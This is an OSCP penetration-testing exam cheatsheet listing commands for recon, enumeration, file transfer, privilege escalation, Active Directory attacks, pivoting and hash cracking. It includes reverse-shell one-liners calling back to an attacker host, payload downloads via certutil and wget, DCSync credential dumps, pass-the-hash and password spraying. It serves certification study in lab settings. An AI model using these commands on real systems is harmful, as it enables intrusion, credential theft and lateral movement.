# OSCP Command Cheatsheet

## 0. Exam rules quick-reminders
- Metasploit: **one** target only (you choose). No auto-exploitation frameworks otherwise.
- Allowed: nmap, nikto, gobuster/ffuf/feroxbuster, netexec, hydra, chisel, evil-winrm, etc.
- NOT allowed: sqlmap auto-exploit, Autorecon-style mass auto exploit, commercial tools, spoofing, ChatGPT/AI on exam.
- Screenshot every proof with the target IP visible.

## 0.4 Session logging (evidence backup)
```
./scripts/logsession.sh box1     # logged shell; captures all I/O incl. shells
```

## 0.5 Proof capture (screenshot flag + IP together)
```
./scripts/proof.sh -o windows                       # print on-target commands
./scripts/proof.sh -n box1 -i 10.10.10.10 -t local -f <flag>   # record user flag
./scripts/proof.sh -n box1 -i 10.10.10.10 -t proof -f <flag>   # record root flag
./scripts/proof.sh -l                               # running tally + est. points
# On target, ALWAYS one screenshot with IP visible:
#   Windows:  type proof.txt & ipconfig
#   Linux:    cat proof.txt; ip a
```

## 1. Recon
```
# reconx (primary — ranked, per-service, authed AD mode):
./scripts/rx.sh box1 10.10.10.10            # -> scans/reconx/.../NOTES.md
./scripts/rx.sh box1 10.10.10.10 --quick    # fast top-1000
./scripts/rx.sh dc 10.10.10.5 -u u -p p -d dom.htb --bloodhound  # authed AD
python3 ~/Desktop/OSCP-Notes-and-Environment/Tools/reconx/reconx.py --man   # full manual
# fallback (no deps):
./scripts/newtarget.sh box1 10.10.10.10        # make workspace
./scripts/recon.sh 10.10.10.10 box1            # auto nmap + web enum
nmap -p- --min-rate 2000 -Pn <IP>              # full ports
nmap -sVC -p<PORTS> -Pn <IP>                   # versions + scripts
```

## 2. Web
```
feroxbuster -u http://IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://IP -H "Host: FUZZ.target" -w subdomains.txt          # vhost
whatweb http://IP ; nikto -h http://IP
gobuster dir -u http://IP -x php,txt,html -w .../common.txt
```

## 3. SMB / Windows enum
```
netexec smb IP -u '' -p ''                     # null session
netexec smb IP -u user -p pass --shares
smbclient -L //IP/ -N ; smbclient //IP/share -N
enum4linux-ng -A IP
```

## 4. File transfer
```
# Kali (serve dir):
./scripts/serve.sh 7890         # python3 -m http.server 7890 (no sudo; pass 80 to use :80)
# Linux target:
wget http://KALI/linux/linpeas.sh -O /tmp/lp.sh; curl http://KALI/linux/pspy64 -o /tmp/p
# Windows target:
certutil -urlcache -f http://KALI/windows/nc.exe nc.exe
powershell iwr -uri http://KALI/windows/winPEASx64.exe -outfile wp.exe
powershell wget http://KALI/windows/RunasCs.exe -o r.exe
```

## 5. Reverse shells / listeners
```
./scripts/listener.sh 443                       # rlwrap nc -lvnp 443
bash -c 'bash -i >& /dev/tcp/KALI/443 0>&1'
nc.exe KALI 443 -e cmd.exe
# stabilize (linux):
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm; Ctrl-Z; stty raw -echo; fg
```
Revshell generator: https://revshells.com

## 6. Linux privesc
```
./linux/linpeas.sh | tee lp.txt
sudo -l ; find / -perm -4000 2>/dev/null ; getcap -r / 2>/dev/null
./linux/pspy64                                  # watch cron/root procs
# check: GTFOBins for any sudo/SUID binary
```

## 7. Windows privesc
```
winPEASx64.exe ; whoami /priv
# SeImpersonate present ->
PrintSpoofer64.exe -i -c cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
# run as other user with creds:
RunasCs.exe user pass cmd.exe -r KALI:443
```

## 8. Active Directory
```
# FAST-PATH (enum + AS-REP + Kerberoast + optional spray/BloodHound/crack):
./scripts/ad-fastpath.sh -d corp.local -i 10.10.10.5                    # unauth
./scripts/ad-fastpath.sh -d corp.local -i 10.10.10.5 -u bob -p Pass1 -c # roast+crack
./scripts/ad-fastpath.sh -d corp.local -i 10.10.10.5 -u bob -p Pass1 -b # +BloodHound
#   tip: for speed pass -U with a smaller list, e.g.
#   /usr/share/seclists/Usernames/Names/names.txt  or your discovered valid_users.txt
# Password spray / auth
netexec smb DC -u users.txt -p 'Password1' --continue-on-success
kerbrute userenum -d domain.local --dc DC users.txt
# Kerberoast / AS-REP
impacket-GetUserSPNs domain/user:pass -dc-ip DC -request
impacket-GetNPUsers domain/ -dc-ip DC -usersfile users.txt -no-pass
# Crack
hashcat -m 13100 spn.hash rockyou.txt      # TGS
hashcat -m 18200 asrep.hash rockyou.txt    # AS-REP
# Move
evil-winrm -i IP -u user -p pass
netexec smb IP -u user -H NTLMHASH -x whoami      # pass-the-hash
# Build hosts.txt of live boxes (feeds -S below):
./scripts/gen-hosts.sh -r 10.10.10.0/24 -x 10.10.10.10     # discover subnet
./scripts/gen-hosts.sh -r 172.16.5.0/24 -P -A              # pivoted net, port-based
./scripts/gen-hosts.sh -f                                   # reuse saved nmap scans
# POST-COMPROMISE dump + parse + lateral spray:
./scripts/ad-secretsdump.sh -t DC -d domain -u Administrator -p DAPass      # DCSync
./scripts/ad-secretsdump.sh -t HOST -u Administrator -H nthash -l           # local SAM (PtH)
./scripts/ad-secretsdump.sh -t DC -d domain -u adm -p pass -S hosts.txt     # dump then spray
impacket-secretsdump domain/user:pass@DC          # raw dump / DCSync
impacket-psexec domain/user:pass@IP
# BloodHound collection
./ad/sharphound/SharpHound.exe -c All
netexec ldap DC -u user -p pass --bloodhound -c all --dns-server DC
```

## 9. Pivoting (chisel)
```
# Kali (server):
./linux/chisel server -p 8000 --reverse
# Target (client) -> SOCKS proxy back to Kali:
./chisel client KALI:8000 R:socks
# then: proxychains4 nmap -sT -Pn <internal-IP>
```

## 10. Password cracking
```
hashcat -m 0 hash.txt rockyou.txt          # MD5
hashcat -m 1000 hash.txt rockyou.txt       # NTLM
john --wordlist=rockyou.txt hash.txt
hydra -L users -P rockyou.txt IP ssh
```
